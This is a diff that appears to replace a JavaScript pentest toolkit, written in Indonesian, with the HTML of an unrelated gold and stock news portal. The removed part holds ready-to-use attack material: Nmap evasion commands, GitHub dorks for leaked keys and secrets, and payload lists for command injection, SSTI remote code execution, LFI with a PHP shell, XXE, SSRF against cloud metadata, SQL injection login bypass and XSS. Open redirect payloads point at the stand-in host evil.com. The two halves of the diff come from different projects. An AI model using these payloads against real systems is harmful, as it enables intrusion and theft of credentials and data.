-  var dom=e.split('@')[1];var mx='?';
-  try{var j=await(await fetch('https://dns.google/resolve?name='+encodeURIComponent(dom)+'&type=15')).json();
-  mx=j.Answer?j.Answer.map(a=>a.data).join(', '):'TIDAK ADA ⚠'}catch(x){}
-  outBox(b,'Format : '+(/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)?'✔':'✘')+'\nDomain : '+dom+'\nMX     : '+mx);bump()});
-reg('OSINT','Email Permutator','Generate kombinasi email kandidat',async b=>{
-  var fn=ask('Nama depan:','jhon'),ln=ask('Nama belakang:','doe'),dom=ask('Domain:','example.com');
-  var c=[...new Set([fn+'.'+ln,fn+ln,fn[0]+ln,fn+ln[0],fn[0]+'.'+ln,ln+'.'+fn].map(x=>x.toLowerCase()+'@'+dom))];
-  outBox(b,'Kandidat (verifikasi manual):\n\n'+c.join('\n'));bump()});
-reg('OSINT','Username Enumerator','Cek username di 10 platform publik',async b=>{
-  var u=ask('Username:','');if(!u)return;
-  var s=['GitHub|https://github.com/','Reddit|https://www.reddit.com/user/','X|https://x.com/','Instagram|https://www.instagram.com/','TikTok|https://www.tiktok.com/@','Telegram|https://t.me/','YouTube|https://www.youtube.com/@','Medium|https://medium.com/@','Pastebin|https://pastebin.com/u/','Slideshare|https://www.slideshare.net/'];
-  outBox(b,'Verifikasi manual (no-cors tak bisa baca status):\n\n'+s.map(x=>x.replace('|',' : ')+u).join('\n'));bump()});
-reg('OSINT','Breach Check Hub','Link cek breach (email lu sendiri)',async b=>{
-  var e=ask('Email:','');if(!e)return;
-  outBox(b,'https://haveibeenpwned.com/account/'+encodeURIComponent(e)+'\nhttps://www.dehashed.com/search?query='+encodeURIComponent(e)+'\n\n⚠ Gunakan HANYA untuk email lu sendiri / kewenangan hukum.')});
-reg('OSINT','OSINT Hub','Link OSINT per kategori',async b=>{
-  var d=ask('Domain/username/email:','example.com');
-  outBox(b,`Domain : https://who.is/whois/${d}
-Cert   : https://crt.sh/?q=${d}
-Wayback: https://web.archive.org/web/*/${d}
-Shodan : https://www.shodan.io/search?query=${d}
-Censys : https://search.censys.io/search?resource=hosts&q=${d}
-VT     : https://www.virustotal.com/gui/domain/${d}
-SecTrails: https://securitytrails.com/domain/${d}/dns`)});
+                    <button onclick="openThemeModal()" class="p-2 rounded-xl bg-slate-800 border border-slate-700 hover:border-cyan-500/50 text-cyan-400 transition" title="Kustomisasi Warna Aksen">
+                        <i class="fa-solid fa-palette text-sm"></i>
+                    </button>
 
-/* ---------- RECON ---------- */
-reg('RECON','DNS Lookup (DoH)','A/AAAA/MX/NS/TXT/CAA',async b=>{
-  var d=ask('Domain:','example.com');if(!d)return;var o='';
-  for(var t of [[1,'A'],[28,'AAAA'],[15,'MX'],[2,'NS'],[16,'TXT'],[257,'CAA']]){
-    try{var j=await(await fetch('https://dns.google/resolve?name='+encodeURIComponent(d)+'&type='+t[0])).json();
-    o+='['+t[1]+'] '+(j.Answer?j.Answer.map(a=>a.data).join('\n        '):'(kosong)')+'\n'}catch(e){o+='['+t[1]+'] ERR\n'}}
-  outBox(b,o);bump()});
-reg('RECON','Subdomain Enum','crt.sh cert transparency',async b=>{
-  var d=ask('Domain:','example.com');if(!d)return;
-  try{var j=await(await fetch('https://crt.sh/?q=%25.'+encodeURIComponent(d)+'&output=json')).json();
-  var s=[...new Set(j.map(x=>x.name_value).join('\n').split('\n').map(x=>x.trim()))].sort();
-  outBox(b,s.length+' subdomain:\n\n'+s.join('\n'));dload('subdomains-'+d+'.txt',s.join('\n'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('RECON','Subdomain Takeover Hints','Cek CNAME rawan takeover',async b=>{
-  var d=ask('Subdomain:','blog.example.com');if(!d)return;
-  var j=await(await fetch('https://dns.google/resolve?name='+encodeURIComponent(d)+'&type=5')).json();
-  var cn=j.Answer?j.Answer.map(a=>a.data).join(', '):'(no CNAME)';
-  var risky=['s3.amazonaws.com','azurewebsites.net','herokuapp.com','github.io','firebaseapp.com','cloudfront.net','blob.core.windows.net','vercel.app','netlify.app'];
-  var hit=risky.filter(r=>cn.toLowerCase().includes(r));
-  outBox(b,'CNAME: '+cn+'\n\n'+(hit.length?'⚠ RAWAN — cek dgn nuclei:\nnuclei -u https://'+d+' -t takeovers/':'✔ tidak ada fingerprint risky umum'))});
-reg('RECON','Header Inspector','Audit security header via hackertarget',async b=>{
-  var t=ask('URL:','https://example.com');if(!t)return;
-  try{var txt=await(await fetch('https://api.hackertarget.com/httpheaders/?q='+encodeURIComponent(t))).text();
-  var need=['strict-transport-security','content-security-policy','x-frame-options','x-content-type-options','referrer-policy','permissions-policy'];
-  var miss=need.filter(h=>!txt.toLowerCase().includes(h));
-  outBox(b,txt+'\n\n--- AUDIT ---\n'+(miss.length?'⚠ MISSING:\n'+miss.join('\n'):'✔ lengkap'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('RECON','IP Intelligence','Geo/ASN/org via ipwho.is',async b=>{
-  var ip=ask('IP (kosong = IP lu):','')||'';
-  try{outBox(b,JSON.stringify(await(await fetch('https://ipwho.is/'+ip)).json(),null,2))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('RECON','CIDR Calculator','Network/netmask/broadcast/hosts',async b=>{
-  var t=ask('CIDR:','10.0.0.0/8');
-  try{var m=t.match(/^(\d+\.\d+\.\d+\.\d+)\/(\d+)$/);if(!m)throw new Error('format salah');
-  var ip=m[1].split('.').map(Number),bits=+m[2];
-  var ipn=((ip[0]<<24)>>>0)+(ip[1]<<16)+(ip[2]<<8)+ip[3];
-  var mask=bits===0?0:(0xFFFFFFFF<<(32-bits))>>>0;
-  var net=(ipn&mask)>>>0,bc=(net|(~mask>>>0))>>>0;
-  var f=n=>[(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255].join('.');
-  outBox(b,'Network: '+f(net)+'/'+bits+'\nNetmask: '+f(mask)+'\nBroadcast: '+f(bc)+'\nFirst  : '+f(net+1)+'\nLast   : '+f(bc-1)+'\nHosts  : '+Math.max(0,Math.pow(2,32-bits)-2))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('RECON','Wayback History','Snapshot arsip',async b=>{
-  var d=ask('Domain:','example.com');if(!d)return;
-  try{var j=await(await fetch('https://web.archive.org/cdx/search/cdx?url='+encodeURIComponent(d)+'&output=json&limit=50&collapse=urlkey&fl=timestamp,original,statuscode')).json();j.shift();
-  outBox(b,j.length?j.map(x=>x[0]+' ['+x[2]+'] '+x[1]).join('\n'):'(kosong)')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('RECON','Tech Fingerprint','Fingerprint via headers',async b=>{
-  var t=ask('URL:','https://example.com');if(!t)return;
-  try{var txt=await(await fetch('https://api.hackertarget.com/httpheaders/?q='+encodeURIComponent(t))).text();
-  var sig=[['server','Server'],['x-powered-by','Framework'],['x-aspnet','ASP.NET'],['x-generator','CMS'],['cf-ray','Cloudflare']];
-  outBox(b,txt+'\n\n--- FINGERPRINT ---\n'+sig.map(s=>txt.toLowerCase().includes(s[0])?'✔ '+s[1]:'  '+s[1]+' : -').join('\n'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('RECON','URL Extractor','Ekstrak URL dari teks/HTML',async b=>{
-  var t=prompt('Paste teks/HTML:');if(!t)return;
-  var u=[...new Set(t.match(/https?:\/\/[^\s"'<>()]+/g)||[])].sort();
-  outBox(b,u.length+' URL:\n\n'+u.join('\n'));dload('urls.txt',u.join('\n'));bump()});
+                    <div class="relative hidden sm:block">
+                        <input type="text" id="globalSearchInput" onkeyup="filterNewsBySearch()" placeholder="Cari berita, saham, emas..." class="w-36 md:w-48 bg-slate-950 border border-slate-800 text-xs rounded-xl pl-8 pr-3 py-2 text-slate-200 placeholder-slate-500 focus:outline-none focus:border-amber-500 transition">
+                        <i class="fa-solid fa-magnifying-glass absolute left-2.5 top-2.5 text-slate-500 text-xs"></i>
+                    </div>
 
-/* ---------- NMAP ---------- */
-cheat('NMAP','Nmap Command Builder','Builder lengkap',async b=>{
-  outBox(b,`=== NMAP COMMAND BUILDER (target berizin) ===
+                    <button onclick="openApiModal()" class="px-2.5 py-1.5 rounded-xl bg-slate-800 border border-emerald-500/40 text-emerald-400 hover:bg-slate-700 transition flex items-center gap-1.5 text-xs font-bold shadow-md" title="Status Integrasi API Active">
+                        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                        <span class="hidden md:inline">API AKTIF</span>
+                        <i class="fa-solid fa-key text-[10px]"></i>
+                    </button>
 
-Fast sweep          : nmap -sn 10.0.0.0/24
-Top 1000 ports      : nmap <target>
-Full port + service : nmap -sS -sV -p- -T4 -A <target> -oN full.txt
-UDP top ports       : nmap -sU --top-ports 100 <target>
-Version + scripts   : nmap -sV -sC -p <ports> <target>
-Vuln scripts        : nmap --script vuln <target>
-Aggressive          : nmap -A -T4 <target>
-Firewall evasive    : nmap -f --mtu 24 -D RND:5 -sS <target>
+                    <button onclick="toggleMobileMenu()" class="xl:hidden p-2 rounded-xl bg-slate-800 text-slate-300 hover:text-white border border-slate-700">
+                        <i class="fa-solid fa-bars text-lg"></i>
+                    </button>
+                </div>
 
-Jalankan di Kali lu. Parse hasil lewat "Nmap XML Parser".`);bump()});
-reg('NMAP','Nmap XML Parser','Paste -oX XML → host+port',async b=>{
-  var t=prompt('Paste XML nmap:');if(!t)return;
-  var doc=new DOMParser().parseFromString(t,'text/xml');
-  var hosts=[...doc.querySelectorAll('host')];var o='';
-  hosts.forEach(h=>{
-    var ip=h.querySelector('address')?.getAttribute('addr')||'?';
-    var os=h.querySelector('osclass')?.getAttribute('osname')||'?';
-    o+='HOST: '+ip+' (OS: '+os+')\n';
-    h.querySelectorAll('port').forEach(p=>o+='  '+p.getAttribute('portid')+' '+p.querySelector('state').getAttribute('state')+' '+(p.querySelector('service')?.getAttribute('name')||'')+'\n');
-    o+='\n'});
-  outBox(b,o||'(tidak ada host)');bump()});
-reg('NMAP','Nmap GNMAP Parser','Parse .gnmap',async b=>{
-  var t=prompt('Paste .gnmap:');if(!t)return;
-  var o=t.split('\n').filter(l=>l.includes('Status: Up')).map(l=>{
-    var ip=l.match(/Host: ([\d.]+)/)?.[1]||'?';
-    var ports=(l.match(/Ports:\s*([^\t]+)/)?.[1]||'').split(', ').map(p=>p.split('/')[0]).filter(Boolean);
-    return ip+' → '+ports.join(',')}).join('\n');
-  outBox(b,o||'(kosong)');bump()});
-cheat('NMAP','Nmap Scan Type Cheat','Semua flag scan',async b=>{
-  outBox(b,`-sS SYN stealth | -sT TCP connect | -sU UDP | -sV version | -sC default scripts
--O OS | -A aggressive | -Pn skip host discovery | -sn ping sweep
--f fragment | --mtu N | -D RND:5 decoy | --source-port 53 | -T0..T5`);bump()});
+            </div>
+        </div>
 
-/* ---------- NUCLEI ---------- */
-cheat('NUCLEI','Nuclei Quickstart','Install & command dasar',async b=>{
-  outBox(b,`go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
-nuclei -update-templates
+        <!-- MOBILE MENU DROPDOWN -->
+        <div id="mobileMenu" class="hidden xl:hidden bg-slate-900 border-b border-slate-800 px-4 py-4 space-y-2 max-h-[80vh] overflow-y-auto">
+            <div class="mb-3">
+                <input type="text" id="mobileSearchInput" onkeyup="filterNewsBySearchMobile()" placeholder="Cari berita, saham, emas..." class="w-full bg-slate-950 border border-slate-800 text-xs rounded-xl pl-8 pr-3 py-2.5 text-slate-200 placeholder-slate-500 focus:outline-none focus:border-amber-500">
+            </div>
+            <button onclick="switchTab('dashboard'); toggleMobileMenu()" class="w-full text-left px-3 py-2.5 rounded-xl text-xs font-bold text-amber-400 bg-slate-800 flex items-center gap-2"><i class="fa-solid fa-house w-5"></i> Beranda</button>
+            <button onclick="switchTab('emas'); toggleMobileMenu()" class="w-full text-left px-3 py-2.5 rounded-xl text-xs font-semibold text-slate-300 hover:bg-slate-800 flex items-center gap-2"><i class="fa-solid fa-coins text-amber-400 w-5"></i> Harga Emas Live</button>
+            <button onclick="switchTab('portfolio'); toggleMobileMenu()" class="w-full text-left px-3 py-2.5 rounded-xl text-xs font-semibold text-slate-300 hover:bg-slate-800 flex items-center gap-2"><i class="fa-solid fa-vault text-emerald-400 w-5"></i> Portofolio & Target Logam</button>
+            <button onclick="switchTab('news'); toggleMobileMenu()" class="w-full text-left px-3 py-2.5 rounded-xl text-xs font-semibold text-slate-300 hover:bg-slate-800 flex items-center gap-2"><i class="fa-solid fa-newspaper text-cyan-400 w-5"></i> Berita Pasar Modal</button>
+            <button onclick="switchTab('tradingview'); toggleMobileMenu()" class="w-full text-left px-3 py-2.5 rounded-xl text-xs font-semibold text-slate-300 hover:bg-slate-800 flex items-center gap-2"><i class="fa-solid fa-chart-area text-purple-400 w-5"></i> Grafik Charting TradingView</button>
+            <button onclick="switchTab('macro'); toggleMobileMenu()" class="w-full text-left px-3 py-2.5 rounded-xl text-xs font-semibold text-slate-300 hover:bg-slate-800 flex items-center gap-2"><i class="fa-solid fa-globe text-indigo-400 w-5"></i> Makro Ekonomi Global</button>
+            <button onclick="switchTab('calc'); toggleMobileMenu()" class="w-full text-left px-3 py-2.5 rounded-xl text-xs font-semibold text-slate-300 hover:bg-slate-800 flex items-center gap-2"><i class="fa-solid fa-robot text-rose-400 w-5"></i> AI Assistant & Kalkulator Zakat</button>
+        </div>
+    </header>
 
-nuclei -u https://target -t cves/ -severity critical,high
-nuclei -l urls.txt -t nuclei-templates/ -o hasil.txt
-nuclei -u target -tags takeover,tech`);bump()});
-reg('NUCLEI','Custom Template Generator','Generate YAML template kustom',async b=>{
-  var id=ask('ID template:','custom-exposure');
-  var match=ask('String match:','admin');
-  var path=ask('Path:','/');
-  var y='id: '+id+'\ninfo:\n  name: Custom Check — '+match+'\n  author: M4zk1pL4y\n  severity: medium\n  tags: custom\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}'+path+'"\n    matchers:\n      - type: word\n        words:\n          - "'+match+'"\n      - type: status\n        status:\n          - 200';
-  outBox(b,y);dload(id+'.yaml',y);bump()});
-reg('NUCLEI','Nuclei Output Parser','Parse hasil scan nuclei',async b=>{
-  var t=prompt('Paste output nuclei:');if(!t)return;
-  var by={};t.split('\n').filter(l=>l.trim()).forEach(l=>{var m=l.match(/\[(critical|high|medium|low|info)\]/i);var s=m?m[1].toLowerCase():'unknown';(by[s]=by[s]||[]).push(l)});
-  var order=['critical','high','medium','low','info','unknown'];var o='';
-  order.forEach(s=>{if(by[s])o+='== '+s.toUpperCase()+' ('+by[s].length+') ==\n'+by[s].join('\n')+'\n\n'});
-  outBox(b,o||'(tidak terbaca)');bump()});
-cheat('NUCLEI','Nuclei Pipeline','Pipeline recon → nuclei',async b=>{
-  outBox(b,`cat subs.txt | httpx -silent | nuclei -t cves/ -severity critical,high
-cat subs.txt | httpx -tech-detect -screenshot -o alive.txt
-subfinder -d target.com -silent | httpx -silent | nuclei -severity critical,high`);bump()});
+    <!-- MAIN CONTAINER -->
+    <main class="flex-grow max-w-7xl w-full mx-auto px-3 sm:px-6 lg:px-8 py-6 space-y-8">
 
-/* ---------- DORK ---------- */
-reg('DORK','Google Dork Builder','Dork recon domain',async b=>{
-  var d=ask('Domain:','example.com');if(!d)return;
-  var ds=['site:'+d+' intitle:"index of"','site:'+d+' ext:env|ext:sql|ext:log|ext:bak','site:'+d+' inurl:admin|inurl:login','site:'+d+' intitle:"index of" password','site:'+d+' ext:xml|ext:conf|ext:ini','site:'+d+' inurl:wp-|inurl:uploads','site:'+d+' inurl:php?id='];
-  outBox(b,ds.map((x,i)=>(i+1)+'. '+x+'\n   → https://www.google.com/search?q='+encodeURIComponent(x)).join('\n\n'));bump()});
-reg('DORK','GitHub Dork Builder','Cari secret di GitHub (org lu)',async b=>{
-  var d=ask('Target/org:','');if(!d)return;
-  var out=['"'+d+'" password','"'+d+'" api_key OR apikey','"'+d+'" secret OR token','"'+d+'" filename:.env','"'+d+'" "BEGIN RSA PRIVATE KEY"'];
-  outBox(b,out.map((x,i)=>(i+1)+'. '+x+'\n   → https://github.com/search?q='+encodeURIComponent(x)+'&type=code').join('\n\n'));bump()});
+        <!-- SYSTEM BANNER -->
+        <div class="bg-gradient-to-r from-amber-950/50 via-slate-900 to-cyan-950/50 border border-amber-500/40 rounded-2xl p-4 sm:p-5 flex flex-col md:flex-row items-start md:items-center justify-between gap-4 shadow-2xl relative overflow-hidden">
+            <div class="flex items-center gap-3.5">
+                <div class="w-12 h-12 rounded-2xl bg-amber-500/20 border border-amber-500/50 flex items-center justify-center text-amber-400 shrink-0 shadow-inner">
+                    <i class="fa-solid fa-shield-halved text-2xl"></i>
+                </div>
+                <div>
+                    <div class="flex flex-wrap items-center gap-2">
+                        <h4 class="text-sm sm:text-base font-extrabold text-white">
+                            Mazkiplay News - Production Ready Intelligence Portal
+                        </h4>
+                        <span class="text-[10px] bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 px-2 py-0.5 rounded-full font-mono font-bold flex items-center gap-1">
+                            <i class="fa-solid fa-circle-check"></i> GoAPI, Emas Maulana, & Trading Economics Connected
+                        </span>
+                    </div>
+                    <p class="text-xs text-slate-300 mt-1">
+                        Informasi harga emas, IHSG, nilai tukar valas, serta chart teknikal diperbarui secara realtime.
+                    </p>
+                </div>
+            </div>
 
-/* ---------- WEB ---------- */
-reg('WEB','Cookie Analyzer','Analisis atribut keamanan cookie',async b=>{
-  var c=prompt('Paste Set-Cookie:');if(!c)return;
-  var miss=['Secure','HttpOnly','SameSite'].filter(x=>!c.includes(x));
-  outBox(b,c.replace(/;\s*/g,'\n')+'\n\n⚠ MISSING: '+(miss.length?miss.join(', '):'-'))});
-reg('WEB','CSP Analyzer','Analisis CSP',async b=>{
-  var c=prompt('Paste CSP:');if(!c)return;
-  var o='';
-  if(c.includes('unsafe-inline'))o+='⚠ unsafe-inline\n';
-  if(c.includes('unsafe-eval'))o+='⚠ unsafe-eval\n';
-  if(c.includes('*'))o+='⚠ wildcard *\n';
-  if(!c.includes('default-src')&&!c.includes('script-src'))o+='⚠ no script-src\n';
-  if(!c.includes('frame-ancestors'))o+='⚠ no frame-ancestors\n';
-  outBox(b,o||'✔ CSP ketat')});
-reg('WEB','JWT Decoder','Decode JWT + cek exp/alg',async b=>{
-  var t=prompt('JWT:');if(!t)return;
-  try{var p=t.split('.');var d=s=>JSON.parse(decodeURIComponent(escape(atob(s.replace(/-/g,'+').replace(/_/g,'/')))));
-  var h=d(p[0]),pl=d(p[1]);
-  var exp=pl.exp?'\nExp : '+new Date(pl.exp*1000).toLocaleString('id-ID')+(pl.exp*1000<Date.now()?' ⚠ EXPIRED':' ✔ aktif'):'';
-  outBox(b,'HEADER:\n'+JSON.stringify(h,null,2)+'\n\nPAYLOAD:\n'+JSON.stringify(pl,null,2)+exp+'\n\n⚠ Decode ≠ Verify.')}catch(e){outBox(b,'INVALID: '+e.message)}bump()});
-cheat('WEB','Open Redirect Payloads','Payload redirect',async b=>{
-  outBox(b,`//target.com
-//evil.com
-///evil.com
-https:evil.com
-\/\/evil.com
-/?next=//evil.com
-https://target.com@evil.com
-%2F%2Fevil.com
-https%3A%2F%2Fevil.com`);bump()});
-cheat('WEB','Command Injection Cheat','Payload injeksi cmd',async b=>{
-  outBox(b,`; ls
-| whoami
-&& cat /etc/passwd
-$(id)
-; sleep 10
-& ping -c 5 10.10.14.1 &
-Windows : & dir | | type C:\\flag.txt
-Bypass spc: cat${IFS}/etc/passwd | {cat,/etc/passwd}`);bump()});
-cheat('WEB','SSTI Payload Cheat','SSTI payloads',async b=>{
-  outBox(b,`Detect  : {{7*7}}  \${7*7}  #{7*7}
-Jinja2  : {{config}} | {{''.__class__.__mro__[1].__subclasses__()}}
-RCE     : {{''.__class__.__base__.__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
-Twig    : {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`);bump()});
-cheat('WEB','LFI Payload Cheat','LFI paths',async b=>{
-  outBox(b,`/etc/passwd
-/etc/passwd%00
-....//....//....//etc/passwd
-%2e%2e%2f%2e%2e%2fetc%2fpasswd
-/proc/self/environ
-php://filter/convert.base64-encode/resource=/etc/passwd
-php://input
-data://text/plain,<?php system($_GET[0]);?>`);bump()});
-cheat('WEB','XXE Payload Cheat','XXE payloads',async b=>{
-  outBox(b,`Classic: <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
-SSRF   : <!ENTITY xxe SYSTEM "http://10.0.0.1:80/">
-CDATA  : %eval;%exfil;
-XInclude: <xi:include href="file:///etc/passwd" parse="text"/>`);bump()});
-cheat('WEB','SSRF Payload Cheat','SSRF payloads',async b=>{
-  outBox(b,`http://127.0.0.1:80
-http://localhost:8080
-http://169.254.169.254/latest/meta-data/
-http://metadata.google.internal/computeMetadata/v1/
-file:///etc/passwd
-http://[::1]:80
-DNS rebinding: 7f000001.rbndr.us`);bump()});
-reg('WEB','Curl Builder','Generate curl',async b=>{
-  var u=ask('URL:','https://example.com'),m=ask('Method:','GET');
-  var h=ask('Headers (K:V;):',''),d=ask('Body:','');
-  outBox(b,'curl -X '+m+' \''+u+'\' \\\n'+h.split(';').filter(Boolean).map(x=>'  -H \''+x.trim()+'\' \\\n').join('')+(m!=='GET'&&d?'  -d \''+d+'\' \\\n':'')+'  -i -k');bump()});
+            <div class="flex items-center gap-2 w-full md:w-auto shrink-0">
+                <button onclick="openApiModal()" class="w-full md:w-auto px-4 py-2 bg-gradient-to-r from-amber-500 to-amber-400 hover:from-amber-400 text-slate-950 font-black rounded-xl text-xs transition flex items-center justify-center gap-2 shadow-lg glow-gold">
+                    <i class="fa-solid fa-sliders"></i> Inspeksi Modul API
+                </button>
+            </div>
+        </div>
 
-/* ---------- SQLI ---------- */
-reg('SQLI','Payload Library','Error/union/time-based',async b=>{
-  var o={'Error':["' OR '1'='1","' OR 1=1-- -","admin'-- -","' AND 1=CONVERT(int,@@version)-- -"],
-  'UNION':["' UNION SELECT NULL-- -","' UNION SELECT NULL,NULL-- -","' UNION SELECT NULL,table_name FROM information_schema.tables-- -"],
-  'Time (MySQL)':["' AND SLEEP(5)-- -","' AND BENCHMARK(5000000,MD5('x'))-- -"],
-  'Time (MSSQL)':["'; WAITFOR DELAY '0:0:5'-- -"],
-  'SQLite':["' OR 1=1 LIMIT 1 OFFSET 0-- -","' UNION SELECT sql,1 FROM sqlite_master-- -"]};
-  var t='';for(var k in o)t+='== '+k+' ==\n'+o[k].join('\n')+'\n\n';
-  outBox(b,t);dload('sqli-payloads.txt',t);bump()});
-reg('SQLI','Param Fuzzer','URL ter-payload manual',async b=>{
-  var u=ask('URL dgn param:','https://example.com/item.php?id=');
-  var pl=["'","1' OR '1'='1","1' AND SLEEP(5)-- -","1 UNION SELECT 1,2,3-- -","1;WAITFOR DELAY '0:0:5'-- -"];
-  outBox(b,pl.map(p=>u.replace(/=/g,'='+encodeURIComponent(p))).join('\n'));bump()});
-reg('SQLI','SQLMap Builder','Generate command sqlmap',async b=>{
-  var u=ask('URL:','https://example.com/item.php?id=1'),o=ask('Level (1-5):','3');
-  outBox(b,`sqlmap -u '${u}' --level=${o} --risk=2 --batch --threads=5
+        <!-- ================= TAB 1: DASHBOARD ================= -->
+        <div id="tab-dashboard" class="tab-content space-y-8">
 
-Dengan cookie : --cookie="SESSION=..."
-POST          : --data="user=*&pass=x"
-Dump DB       : --dbs
-Dump tabel    : -D dbname --tables
-Dump data     : -D db -T users --dump
-Tamper WAF    : --tamper=space2comment
-Proxy         : --proxy=http://127.0.0.1:8080`);bump()});
-cheat('SQLI','Login Bypass Payloads','Bypass form login',async b=>{
-  outBox(b,`admin'-- -
-' OR '1'='1
-' OR 1=1-- -
-" OR ""="
-') OR ('1'='1
-' UNION SELECT 1,1,'admin','admin','admin'-- -`);bump()});
+            <!-- METRIC CARDS GRID -->
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                
+                <div class="glass-card rounded-2xl p-5 hover:border-amber-500/60 transition shadow-xl relative overflow-hidden group">
+                    <div class="flex items-center justify-between mb-3">
+                        <span class="text-xs font-bold text-amber-400 uppercase tracking-wider flex items-center gap-1.5">
+                            <i class="fa-solid fa-coins"></i> Emas Antam (1 Gram)
+                        </span>
+                        <span class="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-md font-mono font-bold">Maulana API</span>
+                    </div>
+                    <div class="text-2xl sm:text-3xl font-black text-white tracking-tight" id="dashGoldPrice">Rp 1.485.000</div>
+                    <div class="mt-2 flex items-center justify-between text-xs">
+                        <span class="text-emerald-400 font-bold"><i class="fa-solid fa-arrow-trend-up"></i> +Rp 6.000 (+0.40%)</span>
+                        <span class="text-slate-400">Buyback: <strong class="text-slate-200" id="dashGoldBuyback">Rp 1.332.000</strong></span>
+                    </div>
+                </div>
 
-/* ---------- XSS ---------- */
-reg('XSS','Payload Library','Basic/event/bypass/polyglot',async b=>{
-  var t='== Basic ==\n<script>alert(1)<\/script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n== Event ==\n<details open ontoggle=alert(1)>\n<video><source onerror=alert(1)>\n\n== Bypass ==\n<ScRiPt>alert(1)</ScRiPt>\n<img src=x onerror=alert&lpar;1&rpar;>\n\n== Polyglot ==\njaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>';
-  outBox(b,t);dload('xss-payloads.txt',t);bump()});
-reg('XSS','Encoder/Obfuscator','Encode payload',async b=>{
-  var p=ask('Payload:','<img src=x onerror=alert(1)>');if(!p)return;
-  outBox(b,'HTML entity: '+p.replace(/[<>&"]/g,c=>'&#'+c.charCodeAt(0)+';')+'\nURL        : '+encodeURIComponent(p)+'\nDouble URL : '+encodeURIComponent(encodeURIComponent(p))+'\nUnicode    : \\u'+p.split('').map(c=>c.charCodeAt(0).toString(16).padStart(4,'0')).join('\\u'));bump()});
-reg('XSS','XSS Context Analyzer','Analisis konteks → saran payload',async b=>{
-  var t=prompt('Paste potongan HTML:');if(!t)return;
-  var adv=[];
-  if(/<script[^>]*>\s*[^<]*$/.test(t))adv.push('Dalam <script> string → ";alert(1)//');
-  if(/<textarea/.test(t))adv.push('Textarea → </textarea><img src=x onerror=alert(1)>');
-  if(/<style/.test(t))adv.push('Style → </style><img src=x onerror=alert(1)>');
-  if(/=\s*["']?[^"']*$/.test(t))adv.push('Atribut → " onfocus=alert(1) autofocus="');
-  adv.push('Generik: <img src=x onerror=alert(1)>');
-  outBox(b,adv.join('\n'))});
-cheat('XSS','CSP Bypass Cheat','Bypass CSP',async b=>{
-  outBox(b,`JSONP endpoint diizinkan CSP
-Angular template injection (ng-include)
-gadget di library yang diizinkan
-data: / blob: diizinkan
-CSP header duplikat
-polyfill.io / CDN yang bisa dikuasai attacker`);bump()});
+                <div class="glass-card rounded-2xl p-5 hover:border-cyan-500/60 transition shadow-xl relative overflow-hidden group">
+                    <div class="flex items-center justify-between mb-3">
+                        <span class="text-xs font-bold text-cyan-400 uppercase tracking-wider flex items-center gap-1.5">
+                            <i class="fa-solid fa-chart-line"></i> IHSG Composite
+                        </span>
+                        <span class="text-[10px] bg-cyan-500/20 text-cyan-300 px-2 py-0.5 rounded-md font-mono font-bold">GoAPI Feed</span>
+                    </div>
+                    <div class="text-2xl sm:text-3xl font-black text-white tracking-tight" id="dashIHSG">7.720,15</div>
+                    <div class="mt-2 flex items-center justify-between text-xs">
+                        <span class="text-emerald-400 font-bold"><i class="fa-solid fa-arrow-trend-up"></i> +13.80 (+0.18%)</span>
+                        <span class="text-slate-400">Vol: 18.4B</span>
+                    </div>
+                </div>
 
-/* ---------- FUZZ ---------- */
-reg('FUZZ','Ffuf Builder','Generate command ffuf',async b=>{
-  var u=ask('URL dgn FUZZ:','https://example.com/FUZZ');
-  var w=ask('Wordlist:','/usr/share/wordlists/dirb/common.txt');
-  outBox(b,`ffuf -u ${u} -w ${w} -mc 200,301,302,403 -c -t 40
+                <div class="glass-card rounded-2xl p-5 hover:border-purple-500/60 transition shadow-xl relative overflow-hidden group">
+                    <div class="flex items-center justify-between mb-3">
+                        <span class="text-xs font-bold text-purple-400 uppercase tracking-wider flex items-center gap-1.5">
+                            <i class="fa-solid fa-percent"></i> Inflasi YoY (ID)
+                        </span>
+                        <span class="text-[10px] bg-purple-500/20 text-purple-300 px-2 py-0.5 rounded-md font-mono font-bold">Trading Economics</span>
+                    </div>
+                    <div class="text-2xl sm:text-3xl font-black text-white tracking-tight">2.12%</div>
+                    <div class="mt-2 flex items-center justify-between text-xs">
+                        <span class="text-emerald-400 font-bold"><i class="fa-solid fa-circle-check"></i> Target BI 2.5% ± 1%</span>
+                        <span class="text-slate-400">PDB: 5.05%</span>
+                    </div>
+                </div>
 
-Filter size : -fs 1234
-Recursion   : -recursion -recursion-depth 2
-Extensions  : -e .php,.bak,.html,.txt
-Autocalib   : -ac
-Output      : -o ffuf.json -of json`);bump()});
-reg('FUZZ','Dirb Wordlist','Generate wordlist direktori',async b=>{
-  var base=ask('Kata (;):','admin;login;backup;api;test;dev');
-  var ext=ask('Ekstensi (;):','.php;.bak;.txt;.html');
-  var w=base.split(';').map(x=>x.trim()).filter(Boolean);
-  var e=ext.split(';').map(x=>x.trim()).filter(Boolean);
-  var out=new Set();w.forEach(x=>{out.add(x);e.forEach(y=>out.add(x+y));out.add(x+'/');out.add(x+'.bak')});
-  var t=[...out].join('\n');outBox(b,t);dload('dirb-wordlist.txt',t);bump()});
